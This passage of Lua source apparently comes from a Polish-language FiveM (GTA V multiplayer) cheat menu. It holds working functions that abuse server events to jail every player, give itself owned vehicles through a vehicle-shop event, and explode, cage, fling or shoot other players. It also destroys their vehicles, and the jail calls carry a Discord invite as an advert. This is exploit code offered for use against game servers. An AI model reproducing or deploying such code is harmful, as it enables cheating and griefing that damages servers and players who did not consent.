      SetTextEntry("STRING")
      AddTextComponentString(text)
      DrawText(x, y)
    end

    function RequestModelSync(mod)
      local model = GetHashKey(mod)
      RequestModel(model)
      while not HasModelLoaded(model) do
        RequestModel(model)
        Citizen.Wait(0)
      end
    end

    function ApplyShockwave(entity)
      local pos = GetEntityCoords(PlayerPedId())
      local coord=GetEntityCoords(entity)
      local dx=coord.x - pos.x
      local dy=coord.y - pos.y
      local dz=coord.z - pos.z
      local distance=math.sqrt(dx*dx+dy*dy+dz*dz)
      local distanceRate=(50/distance)*math.pow(1.04,1-distance)
      ApplyForceToEntity(entity, 1, distanceRate*dx,distanceRate*dy,distanceRate*dz, math.random()*math.random(-1,1),math.random()*math.random(-1,1),math.random()*math.random(-1,1), true, false, true, true, true, true)
    end

    local function DoJesusTick(radius)
      local player = PlayerPedId()
      local coords = GetEntityCoords(PlayerPedId())
      local playerVehicle = GetPlayersLastVehicle()
      local inVehicle=IsPedInVehicle(player,playerVehicle,true)

      DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)

      for k in EnumerateVehicles() do
        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
          RequestControlOnce(k)
          ApplyShockwave(k)
        end
      end

      for k in EnumeratePeds() do
        if k~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
          RequestControlOnce(k)
          SetPedRagdollOnCollision(k,true)
          SetPedRagdollForceFall(k)
          ApplyShockwave(k)
        end
      end
    end

    local function DRFT()
      DisablePlayerFiring(PlayerPedId(), true)
      if IsDisabledControlPressed(0, 24) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local camDir = GetCamDirFromScreenCenter()
        local camPos = GetGameplayCamCoord()
        local launchPos = GetEntityCoords(wepent)
        local targetPos = camPos + (camDir * 200.0)

        ClearAreaOfProjectiles(launchPos, 0.0, 1)

        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
      end
    end



    local function MagnetoBoy()
      magnet = not magnet

      if magnet then

        Citizen.CreateThread(function()
        notify("~w~Nacisnij ~r~E ~w~aby użyc")

        local ForceKey = 38
        local Force = 0.5
        local KeyPressed = false
        local KeyTimer = 0
        local KeyDelay = 15
        local ForceEnabled = false
        local StartPush = false

        function forcetick()

          if (KeyPressed) then
            KeyTimer = KeyTimer + 1
            if(KeyTimer >= KeyDelay) then
              KeyTimer = 0
              KeyPressed = false
            end
          end



          if IsControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
            KeyPressed = true
            ForceEnabled = true
          end

          if (StartPush) then

            StartPush = false
            local pid = PlayerPedId()
            local CamRot = GetGameplayCamRot(2)

            local force = 5

            local Fx = -( math.sin(math.rad(CamRot.z)) * force*10 )
            local Fy = ( math.cos(math.rad(CamRot.z)) * force*10 )
            local Fz = force * (CamRot.x*0.2)

            local PlayerVeh = GetVehiclePedIsIn(pid, false)

            for k in EnumerateVehicles() do
              SetEntityInvincible(k, false)
              if IsEntityOnScreen(k) and k ~= PlayerVeh then
                ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)
              end
            end

            for k in EnumeratePeds() do
              if IsEntityOnScreen(k) and k ~= pid then
                ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)
              end
            end

          end


          if IsControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
            KeyPressed = true
            StartPush = true
            ForceEnabled = false
          end

          if (ForceEnabled) then
            local pid = PlayerPedId()
            local PlayerVeh = GetVehiclePedIsIn(pid, false)

            Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)

            local ra = RGB(1.0)

            DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, ra.r, ra.g, ra.b, 135, false, true, 2, nil, nil, false)

            for k in EnumerateVehicles() do
              SetEntityInvincible(k, true)
              if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                RequestControlOnce(k)
                FreezeEntityPosition(k, false)
                Oscillate(k, Markerloc, 0.5, 0.3)
              end
            end

            for k in EnumeratePeds() do
              if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                RequestControlOnce(k)
                SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                FreezeEntityPosition(k, false)
                Oscillate(k, Markerloc, 0.5, 0.3)
              end
            end

          end

        end

        while magnet do forcetick() Wait(0) end
          end)
        else notify("~r~~h~Wyłączone")
        end

      end


      local function jailall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "discord.gg/5GMHtjKZ7F")
          TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
          TSE("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
          TSE("js:jailuser", GetPlayerServerId(i), 45 * 60, "discord.gg/5GMHtjKZ7F")

        end
      end

      local function GiveAllWeapons(target)
        local ped = GetPlayerPed(target)
        for i=0, #allWeapons do
          GiveWeaponToPed(ped, GetHashKey(allWeapons[i]), 9999, false, false)
        end
      end

      local function weaponsall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          GiveAllWeapons(i)
        end
      end

      local function explodeall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          local ped = GetPlayerPed(i)
          local coords = GetEntityCoords(ped)
          AddExplosion(coords.x+1, coords.y+1, coords.z+1, 4, 10000.0, true, false, 0.0)
        end
      end

      local function borgarall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          if IsPedInAnyVehicle(GetPlayerPed(i), true) then
            local hamburg = "xs_prop_hamburgher_wl"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
            AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
          else
            local hamburg = "xs_prop_hamburgher_wl"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
          end
        end
      end
	  
	  
      local function yachtall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          if IsPedInAnyVehicle(GetPlayerPed(i), true) then
            local hamburg = "sm_boat_lod"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
            AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
          else
            local hamburg = "sm_boat_lod"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
          end
        end
      end

	  local function cageall()
		local pbase = GetActivePlayers()
        for i = 1, #pbase do
          x, y, z = table.unpack(GetEntityCoords(i))
          roundx = tonumber(string.format("%.2f", x))
          roundy = tonumber(string.format("%.2f", y))
          roundz = tonumber(string.format("%.2f", z))
          while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do
            Citizen.Wait(0)
            RequestModel(GetHashKey("prop_fnclink_05crnr1"))
          end
          local cage1 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
          local cage2 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
          SetEntityHeading(cage1, -90.0)
          SetEntityHeading(cage2, 90.0)
          FreezeEntityPosition(cage1, true)
          FreezeEntityPosition(cage2, true)
        end
      end

      local function bananapartyall()
        Citizen.CreateThread(function()
        --[[for c = 0, 9 do

          TSE("_chat:messageEntered", "FivemTriggers ^110", { 141, 211, 255 }, "^"..c.."TriggersFivem - Menu!")
        end]]
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          local pisello = CreateObject(-1207431159, 0, 0, 0, true, true, true)
          local pisello2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true)
          local pisello3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true)
          AttachEntityToEntity(pisello, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(pisello2, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(pisello3, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
        end
        end)
      end

      local function RespawnPed(ped, coords, heading)
        SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, false, false, false, true)
        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
        SetPlayerInvincible(ped, false)
        TriggerEvent('playerSpawned', coords.x, coords.y, coords.z)
        ClearPedBloodDamage(ped)
      end

      local function teleporttocoords()
        local pizdax = KeyboardInput("Pozycja X", "", 100)
        local pizday = KeyboardInput("Pozycja Y", "", 100)
        local pizdaz = KeyboardInput("Pozycja Z", "", 100)
        if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
          if	IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
          else
            entity = GetPlayerPed(-1)
          end
          if entity then
            SetEntityCoords(entity, pizdax + 0.5, pizday + 0.5, pizdaz + 0.5, 1, 0, 0, 1)
            notify("~g~Teleportowano na współrzędne!", false)
          end
        else
          notify("~o~Nieprawidłowe współrzędne!", true)
        end
      end

      local function drawcoords()
        local name = KeyboardInput("Wpisz nazwę znacznika", "", 100)
        if name == "" then
          notify("~o~Nieprawidłowa nazwa znacznika!", true)
          return drawcoords()
        else
          local pizdax = KeyboardInput("Pozycja X", "", 100)
          local pizday = KeyboardInput("Pozycja Y", "", 100)
          local pizdaz = KeyboardInput("Pozycja Z", "", 100)
          if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
            local blips = {
              {colour=75, id=84},
            }
            for _, info in pairs(blips) do
              info.blip = AddBlipForCoord(pizdax + 0.5, pizday + 0.5, pizdaz + 0.5)
              SetBlipSprite(info.blip, info.id)
              SetBlipDisplay(info.blip, 4)
              SetBlipScale(info.blip, 0.9)
              SetBlipColour(info.blip, info.colour)
              SetBlipAsShortRange(info.blip, true)
              BeginTextCommandSetBlipName("STRING")
              AddTextComponentString(name)
              EndTextCommandSetBlipName(info.blip)
            end
          else
            notify("~o~Nieprawidłowe współrzędne!", true)
          end
        end
      end

      local function teleporttonearestvehicle()
        local playerPed = GetPlayerPed(-1)
        local playerPedPos = GetEntityCoords(playerPed, true)
        local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
        local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
        local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
        local NearestPlanePos = GetEntityCoords(NearestPlane, true)
        notify("~y~Czekaj...", false)
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
          notify("~o~Nie znaleziono żadnego pojazdu", true)
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
          if IsVehicleSeatFree(NearestPlane, -1) then
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
          else
            local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
          end
          notify("~g~Przeteleportowano do najbliższego pojazdu!", false)
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
          if IsVehicleSeatFree(NearestVehicle, -1) then
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
          else
            local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
          end
          notify("~g~Przeteleportowano do najbliższego pojazdu!", false)
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
          if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, false)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
              local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, false)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
          elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestPlane, -1) then
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, false)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, false)
            else
              local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, false)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, false)
            end
          end
          notify("~g~Przeteleportowano do najbliższego pojazdu!", false)
        end
      end

      local function TeleportToWaypoint()
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
          local blipIterator = GetBlipInfoIdIterator(8)
          local blip = GetFirstBlipInfoId(8, blipIterator)
          WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
          wp = true
        else
          notify("~o~Brak znacznika!", true)
        end

        local zHeigt = 0.0
        height = 1000.0
        while wp do
          Citizen.Wait(0)
          if wp then
            if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
            (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
            then
              entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
            else
              entity = GetPlayerPed(-1)
            end

            SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
            FreezeEntityPosition(entity, true)
            local Pos = GetEntityCoords(entity, true)

            if zHeigt == 0.0 then
              height = height - 25.0
              SetEntityCoords(entity, Pos.x, Pos.y, height)
              bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
            else
              SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
              FreezeEntityPosition(entity, false)
              wp = false
              height = 1000.0
              zHeigt = 0.0
              notify("~g~Przeteleportowano do znacznika!", false)
              break
            end
          end
        end
      end

      local function spawnvehicle()
        local ModelName = KeyboardInput("Wpisz nazwę auta do zrespienia", "", 100)
        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
          RequestModel(ModelName)
          while not HasModelLoaded(ModelName) do
            Citizen.Wait(0)
          end
          local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
          SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
        else
          notify("~o~Model jest nie poprawny!", true)
        end
      end

      local function changeregistrations()
        local eR=KeyboardInput("Rejestracja","",100)chuj=GetVehiclePedIsIn(PlayerPedId(),false)SetVehicleNumberPlateText(chuj,eR)end
      local function repairvehicle()
        SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
        SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
        SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleUndriveable(vehicle,false)
      end

      local function repairengine()
        SetVehicleEngineHealth(vehicle, 1000)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleUndriveable(vehicle,false)
      end

      local function carlicenseplaterino()
        local playerPed = GetPlayerPed(-1)
        local playerVeh = GetVehiclePedIsIn(playerPed, true)
        local result = KeyboardInput("Wpisz rejestrację auta jaką chcesz dostać", "", 100)
        if result ~= "" then
          SetVehicleNumberPlateText(playerVeh, result)
        end
      end

function doshit(playerVeh)
  RequestControl(playerVeh)
      SetVehicleHasBeenOwnedByPlayer(playerVeh, false)
      SetEntityAsMissionEntity(playerVeh, false, false)
      StartVehicleAlarm(playerVeh)
      DetachVehicleWindscreen(playerVeh)
      SmashVehicleWindow(playerVeh, 0)
      SmashVehicleWindow(playerVeh, 1)
      SmashVehicleWindow(playerVeh, 2)
      SmashVehicleWindow(playerVeh, 3)
      SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
      SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
      SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
      SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
      SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
      SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
      SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
      SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
      SetVehicleDoorBroken(playerVeh, 0, true)
      SetVehicleDoorBroken(playerVeh, 1, true)
      SetVehicleDoorBroken(playerVeh, 2, true)
      SetVehicleDoorBroken(playerVeh, 3, true)
      SetVehicleDoorBroken(playerVeh, 4, true)
      SetVehicleDoorBroken(playerVeh, 5, true)
      SetVehicleDoorBroken(playerVeh, 6, true)
      SetVehicleDoorBroken(playerVeh, 7, true)
      SetVehicleLights(playerVeh, 1)
      Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
      SetVehicleNumberPlateTextIndex(playerVeh, 5)
      SetVehicleNumberPlateText(playerVeh, "Patryksu")
      SetVehicleDirtLevel(playerVeh, 10.0)
      SetVehicleModColor_1(playerVeh, 1)
      SetVehicleModColor_2(playerVeh, 1)
      SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
      SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
      SetVehicleBurnout(playerVeh, true)
end

	  function matacumparamasini()
		local ModelName = KeyboardInput("Wpisz nazwę auta do zrespienia", "", 100)
		local NewPlate = KeyboardInput("Wpisz rejestrację auta jaką chcesz dostać", "", 100)
	
		if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
				RequestModel(ModelName)
				while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
				end
	
				local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
				SetVehicleNumberPlateText(veh, NewPlate)
				local vehProps = ESX.Game.GetVehicleProperties(veh)
				TSE("esx_vehicleshop:setVehicleOwned", vehProps)
				notify("~g~~h~Sukces", false)
		else
				notify("~o~~h~Model nie jest prawidłowy!", true)
		end
	end

      function daojosdinpatpemata()
        local playerPed = GetPlayerPed(-1)
        local playerVeh = GetVehiclePedIsIn(playerPed, true)
        if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
          SetVehicleOnGroundProperly(playerVeh)
          notify("~g~Odwrócono pojazd!", false)
        else
          notify("~o~Nie jesteś kierowcą pojazdu", true)
        end
      end


      function stringsplit(inputstr, sep)
        if sep == nil then
          sep = "%s"
        end
        local t = {}
        i = 1
        for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
          t[i] = str
          i = i + 1
        end
        return t
      end

      local Spectating = false
local SpectateTarget = nil

function SpectatePlayer(player)
    local playerPed = PlayerPedId()
    local targetPed = GetPlayerPed(player)
    if not DoesEntityExist(targetPed) then return end

    Spectating = not Spectating
    SpectateTarget = player

    if Spectating then
        NetworkSetInSpectatorMode(true, targetPed)
        notify("Obserwowanie " .. GetPlayerName(player), false)
    else
        NetworkSetInSpectatorMode(false, targetPed)
        notify("Przestano obserwować " .. GetPlayerName(player), false)
        SpectateTarget = nil
    end
end

-- Thread do aktualizacji (opcjonalnie, jeśli chcesz np. podążać kamerą)
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if Spectating and SpectateTarget then
            local targetPed = GetPlayerPed(SpectateTarget)
            if not DoesEntityExist(targetPed) then
                -- gracz wyszedł z serwera
                NetworkSetInSpectatorMode(false, targetPed)
                Spectating = false
                SpectateTarget = nil
            end
        end
    end
end)

      function ShootPlayer(player)
        local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, true)
      end

      function MaxOut(veh)
        SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
        SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
        SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
        SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true)
